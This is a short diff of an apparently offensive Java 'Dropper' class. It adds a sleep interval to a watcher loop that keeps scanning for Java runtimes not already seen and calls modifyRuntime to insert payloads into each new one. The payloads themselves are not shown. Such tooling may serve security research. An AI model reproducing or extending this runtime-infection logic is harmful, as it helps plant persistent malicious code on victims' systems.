@@ -261,7 +261,7 @@ public class Dropper {
 		Set<String> runtimesToIgnore = new HashSet<String>();
 		for(File runtime : getTargets(searchPaths, configuration)){
 			if(debug){
-				System.out.println("Discovered runtime: " + runtime.getAbsolutePath());
+				System.out.println("Discovered target: " + runtime.getAbsolutePath());
 			}
 			if(safetyOff){
 				if(watcher){
@@ -279,19 +279,31 @@ public class Dropper {
 		if (safetyOff && watcher) {
 			boolean searching = true;
 			while (searching) {
-				for (File runtime : getTargets(searchPaths, configuration)) {
-					try {
-						if (!runtimesToIgnore.contains(sha256(runtime))) {
-							if (debug) {
-								System.out.println("Discovered runtime: " + runtime.getAbsolutePath());
-							}
-
-							searching = false;
-							modifyRuntime(configuration, payloads, runtime);
-						}
-					} catch (Exception e) {
-						// skipping runtime
+				try {
+					if(debug){
+						System.out.println("Sleeping: " + watcherSleepTime + "ms");
 					}
+					
+					// sleep
+					Thread.sleep(watcherSleepTime);
+					
+					// search for new targets
+					for (File runtime : getTargets(searchPaths, configuration)) {
+						try {
+							if (!runtimesToIgnore.contains(sha256(runtime))) {
+								if (debug) {
+									System.out.println("Discovered target: " + runtime.getAbsolutePath());
+								}
+
+								searching = false;
+								modifyRuntime(configuration, payloads, runtime);
+							}
+						} catch (Exception e) {
+							// skipping runtime
+						}
+					}
+				} catch (InterruptedException e1) {
+					// couldn't sleep, try again
 				}
 			}
 		}
